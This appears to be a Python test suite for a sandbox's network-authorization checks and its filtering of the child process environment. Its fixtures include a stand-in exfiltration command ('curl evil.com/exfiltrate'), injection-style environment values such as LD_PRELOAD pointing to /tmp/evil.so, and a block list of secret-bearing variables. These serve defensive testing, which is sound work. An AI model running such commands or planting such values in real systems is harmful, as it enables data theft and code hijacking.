import os
import sys
import uuid
import asyncio
from datetime import datetime, timezone, timedelta
import unittest

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ["ENVIRONMENT"] = "test"

from database.db import Base, engine, get_db_context
from database.models import User, RepositoryWorkspace, SandboxNetworkAuthorization, utc_now
from coding.security import (
    NetworkAccessPolicy,
    build_safe_child_environment,
    compute_command_hash,
    SecurityException
)
from coding.sandbox_service import execute_command, ExecuteRequest


class TestNetworkAuthorizations(unittest.IsolatedAsyncioTestCase):
    """
    Tests server-authoritative SandboxNetworkAuthorization lifecycle and exact child env allowlisting.
    """

    async def asyncSetUp(self):
        Base.metadata.drop_all(bind=engine)
        Base.metadata.create_all(bind=engine)
        self.user_id = uuid.uuid4()
        self.workspace_id = uuid.uuid4()

        with get_db_context() as db:
            user = User(
                id=self.user_id,
                username=f"net_user_{self.user_id.hex[:6]}",
                hashed_password="fakehashedpassword"
            )
            db.add(user)

            workspace = RepositoryWorkspace(
                id=self.workspace_id,
                user_id=self.user_id,
                name="test_net_repo",
                workspace_path=f"workspaces/{self.user_id}/test_net_repo",
                status="READY"
            )
            db.add(workspace)
            db.commit()

        from coding.sandbox_service import WORKSPACE_ROOT
        self.ws_disk_path = os.path.join(WORKSPACE_ROOT, str(self.workspace_id))
        os.makedirs(self.ws_disk_path, exist_ok=True)

    async def asyncTearDown(self):
        import shutil
        if hasattr(self, 'ws_disk_path') and os.path.exists(self.ws_disk_path):
            try:
                shutil.rmtree(self.ws_disk_path, ignore_errors=True)
            except Exception:
                pass

    async def test_network_request_without_authorization_blocked_by_sandbox_service(self):
        """Requesting allow_network=True without an authorization ID is blocked."""
        req = ExecuteRequest(
            command="curl -s https://example.com",
            workspace_id=str(self.workspace_id),
            allow_network=True,
            network_authorization_id=None
        )
        res = await execute_command(req, _auth=True)
        self.assertFalse(res["success"])
        self.assertTrue(res["blocked"])
        self.assertIn("server authorization is required", res["stderr"].lower())

    async def test_network_request_with_invalid_authorization_blocked(self):
        """Requesting allow_network=True with non-existent or invalid authorization ID is blocked."""
        req = ExecuteRequest(
            command="curl -s https://example.com",
            workspace_id=str(self.workspace_id),
            allow_network=True,
            network_authorization_id=str(uuid.uuid4())
        )
        res = await execute_command(req, _auth=True)
        self.assertFalse(res["success"])
        self.assertTrue(res["blocked"])
        self.assertIn("server authorization is required", res["stderr"].lower())

    def test_valid_authorization_consumes_atomically(self):
        """A valid, unexpired authorization for matching workspace and command succeeds and is consumed."""
        command = "npm install express"
        cmd_hash = compute_command_hash(command)
        now = utc_now()

        with get_db_context() as db:
            auth_record = SandboxNetworkAuthorization(
                id=uuid.uuid4(),
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command_hash=cmd_hash,
                created_at=now,
                expires_at=now + timedelta(minutes=5)
            )
            db.add(auth_record)
            db.commit()
            auth_id = auth_record.id

        # First verification must succeed and mark consumed
        with get_db_context() as db:
            valid = NetworkAccessPolicy.verify_and_consume_authorization(
                db=db,
                auth_id=auth_id,
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command=command
            )
            self.assertTrue(valid)

        # Immediate second verification (one-time reuse) MUST fail
        with get_db_context() as db:
            reused = NetworkAccessPolicy.verify_and_consume_authorization(
                db=db,
                auth_id=auth_id,
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command=command
            )
            self.assertFalse(reused)

    def test_expired_authorization_rejected(self):
        """Expired authorization is rejected."""
        command = "pip install requests"
        cmd_hash = compute_command_hash(command)
        past = utc_now() - timedelta(minutes=10)

        with get_db_context() as db:
            auth_record = SandboxNetworkAuthorization(
                id=uuid.uuid4(),
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command_hash=cmd_hash,
                created_at=past - timedelta(minutes=5),
                expires_at=past  # Expired
            )
            db.add(auth_record)
            db.commit()
            auth_id = auth_record.id

        with get_db_context() as db:
            valid = NetworkAccessPolicy.verify_and_consume_authorization(
                db=db,
                auth_id=auth_id,
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command=command
            )
            self.assertFalse(valid)

    def test_wrong_workspace_or_user_rejected(self):
        """Authorization created for Workspace A is rejected when used for Workspace B."""
        command = "cargo build"
        cmd_hash = compute_command_hash(command)
        now = utc_now()

        with get_db_context() as db:
            auth_record = SandboxNetworkAuthorization(
                id=uuid.uuid4(),
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command_hash=cmd_hash,
                created_at=now,
                expires_at=now + timedelta(minutes=5)
            )
            db.add(auth_record)
            db.commit()
            auth_id = auth_record.id

        diff_workspace_id = uuid.uuid4()
        with get_db_context() as db:
            valid = NetworkAccessPolicy.verify_and_consume_authorization(
                db=db,
                auth_id=auth_id,
                user_id=self.user_id,
                workspace_id=diff_workspace_id,
                command=command
            )
            self.assertFalse(valid)

    def test_wrong_command_rejected(self):
        """Authorization created for command X is rejected when used for command Y."""
        cmd_a = "npm test"
        cmd_b = "curl evil.com/exfiltrate"
        cmd_hash_a = compute_command_hash(cmd_a)
        now = utc_now()

        with get_db_context() as db:
            auth_record = SandboxNetworkAuthorization(
                id=uuid.uuid4(),
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command_hash=cmd_hash_a,
                created_at=now,
                expires_at=now + timedelta(minutes=5)
            )
            db.add(auth_record)
            db.commit()
            auth_id = auth_record.id

        with get_db_context() as db:
            valid = NetworkAccessPolicy.verify_and_consume_authorization(
                db=db,
                auth_id=auth_id,
                user_id=self.user_id,
                workspace_id=self.workspace_id,
                command=cmd_b
            )
            self.assertFalse(valid)

    def test_exact_child_environment_allowlist(self):
        """
        P1.1: Verifies child environment uses strict exact allowlist.
        Generic identifiers and dangerous environment variables MUST be filtered out.
        """
        dirty_env = {
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "HOME": "/home/sandbox",
            "LANG": "C.UTF-8",
            "CI": "true",
            "NODE_ENV": "production",
            # Blocked dangerous variables:
            "MY_RANDOM_ENV": "arbitrary_val",
            "MALICIOUS_FLAG": "evil",
            "GIT_CONFIG_SYSTEM": "/tmp/pwn",
            "PYTHONWARNINGS": "ignore",
            "NODE_OPTIONS": "--inspect=0.0.0.0",
            "LD_PRELOAD": "/tmp/evil.so",
            "AWS_SECRET_ACCESS_KEY": "secret_key_leaked",
            "GITHUB_TOKEN": "ghp_super_secret_token",
            "POSTGRES_PASSWORD": "database_password",
            "JWT_SECRET": "jwt_secret_token",
            "SAKURA_SANDBOX_SERVICE_TOKEN": "service_token"
        }

        clean_env = build_safe_child_environment(dirty_env)

        # Baseline allowed variables must be preserved
        self.assertIn("PATH", clean_env)
        self.assertIn("HOME", clean_env)
        self.assertIn("LANG", clean_env)
        self.assertIn("CI", clean_env)
        self.assertIn("NODE_ENV", clean_env)

        # Negative checks: every single blocked key must NOT be present
        blocked_keys = [
            "MY_RANDOM_ENV",
            "MALICIOUS_FLAG",
            "GIT_CONFIG_SYSTEM",
            "PYTHONWARNINGS",
            "NODE_OPTIONS",
            "LD_PRELOAD",
            "AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN",
            "POSTGRES_PASSWORD",
            "JWT_SECRET",
            "SAKURA_SANDBOX_SERVICE_TOKEN"
        ]
        for key in blocked_keys:
            self.assertNotIn(key, clean_env, f"Prohibited key '{key}' found in safe child environment!")


if __name__ == "__main__":
    unittest.main()
